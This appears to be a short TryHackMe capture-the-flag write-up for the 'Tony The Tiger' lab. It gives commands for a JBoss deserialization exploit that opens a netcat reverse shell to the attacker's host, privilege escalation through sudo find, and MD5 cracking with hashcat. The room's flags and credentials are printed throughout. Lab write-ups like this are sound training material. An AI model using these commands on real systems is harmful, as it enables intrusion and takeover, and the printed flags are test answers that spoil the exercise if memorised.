# Matheus Jesus 16-04-2020

## Try Hack Me - [Tony The Tiger](https://tryhackme.com/room/tonythetiger)

### IP 10.10.210.254

#### NMap results can be found on the file

80 - blog
8080 Jboss
22 SSH

#### Blog

On blog, download the [image](https://i.imgur.com/be2sOV9.jpg)

```sh
strings wtf2.jpg
```

It will display the flag THM{Tony_Sure_Loves_Frosted_Flakes}

#### Exploiting

After downloading the exploit, run command to start a reverse shell

```sh
python exploit.py --ysoserial-path ysoserial.jar --proto http 10.10.210.254:8080 "nc 10.9.5.234 -e /bin/sh 8888"
```

open shell with

```sh
nc -lvnp 8888; python -c 'import pty; pty.spawn("/bin/bash")' #Spawns a TTY terminal
```

There is a note under /home/jboss/note

it says jboss:likeaboss

```sh
ssh jboss@10.10.210.254
likeaboss
```

hidden file on /home/jboss -> .jboss revealed the flag

THM{50c10ad46b5793704601ecdad865eb06}

#### Rooting

scp linpeas.sh over to the host

the user jboss is able to run /usr/bin/find as root

```sh
sudo find /etc/password -exec /bin/sh \;
```

ROOT  [SUID](https://www.andreafortuna.org/2018/05/16/exploiting-sudo-for-linux-privilege-escalation/)

/root/root.txt
QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==

Seems to be under base64 encoding

Decoded -> bc77ac072ee30e3760806864e234c7cf

hashid bc77ac072ee30e3760806864e234c7cf

MD5

```sh
hashcat -a 0 -m 0 BC77AC072EE30E3760806864E234C7CF /usr/share/wordlists/rockyou.txt --force
```

bc77ac072ee30e3760806864e234c7cf:zxcvbnm123456789
